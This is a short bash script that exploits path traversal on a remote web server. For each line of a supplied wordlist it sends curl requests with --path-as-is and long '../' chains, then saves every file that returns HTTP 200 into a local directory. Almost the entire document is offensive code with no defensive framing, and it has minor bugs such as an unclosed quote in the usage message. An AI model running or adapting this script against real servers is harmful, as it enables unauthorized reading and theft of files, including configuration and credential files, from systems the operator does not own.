#!/bin/bash

input=$1 #wordlist

remoteDomain=$2

if [ ! -d ./web ]; then #create the web directory where the files and directories will be mapped
                   mkdir ./web/
fi

if [ $# -ne 2 ];then
  echo "Please insert 2 arguments:"
  echo "./$0 <wordlist> <remoteDomain[:port]>
fi

while IFS= read -r line
do
   request=$(curl --path-as-is http://$remoteDomain/../../../../../../../../../../../../../../../../../../../../$line -D response.txt &)
   status=$(cat response.txt | cut -d ' ' -f2 | head -1)
   if [ "$status" -eq 200 ]; then
           directory=$(dirname $line)
           if [ ! -d $directory ]; then #if the directory doesn't exist, create it
                   mkdir -p ./web/$directory
           fi
           echo $request > web/$line
   fi
done < "$input"
